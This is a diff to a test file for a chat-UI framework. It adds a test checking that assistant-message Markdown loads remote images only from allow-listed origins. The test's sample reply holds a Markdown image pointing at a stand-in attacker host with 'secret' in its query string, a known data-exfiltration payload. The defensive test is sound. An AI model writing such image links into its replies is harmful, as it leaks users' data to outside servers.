@@ -1,6 +1,7 @@
 /** @jsxRuntime classic */
 /** @jsx React.createElement */
 /** @jsxFrag React.Fragment */
+// deno-lint-ignore verbatim-module-syntax -- classic JSX requires this runtime import.
 import * as React from "react";
 import { defineView } from "@copilotz/copilotz/views";
 import type { BrowserViewContext } from "@copilotz/copilotz/web";
@@ -179,6 +180,43 @@ test("shared Markdown rejects raw HTML and unsafe URLs while preserving escaped 
   );
   assert.ok(button.includes('data-slot="button"'));
   assert.ok(button.includes("<a"));
+});
+
+test("message Markdown loads remote images only from the app's resources.markdown.imageOrigins", async () => {
+  const message = {
+    shows: "message",
+    value: {
+      id: "m",
+      role: "assistant",
+      content:
+        "![chart](https://cdn.example/a.png) ![leak](https://evil.example/?q=secret)",
+    },
+  };
+  for (const imageOrigins of [undefined, ["https://cdn.example"]]) {
+    const runtime = await createBrowserRuntime({
+      renderer: reactRenderer,
+      plugins: [coreWebPlugin, {
+        id: "app",
+        resources: imageOrigins ? { markdown: { imageOrigins } } : {},
+      }],
+      live: new MemorySubscriptions(),
+    });
+    try {
+      const output = runtime.observe(() => runtime.render(message));
+      const html = renderToStaticMarkup(<ObservedView output={output} />);
+      output.dispose();
+      assert.doesNotMatch(html, /evil\.example/);
+      assert.match(html, />leak</);
+      if (imageOrigins) {
+        assert.match(html, /<img [^>]*src="https:\/\/cdn\.example\/a\.png"/);
+      } else {
+        assert.doesNotMatch(html, /<img/);
+        assert.match(html, />chart</);
+      }
+    } finally {
+      runtime.dispose();
+    }
+  }
 });
 
 test("admin query Views render existing authorized Action results", async () => {
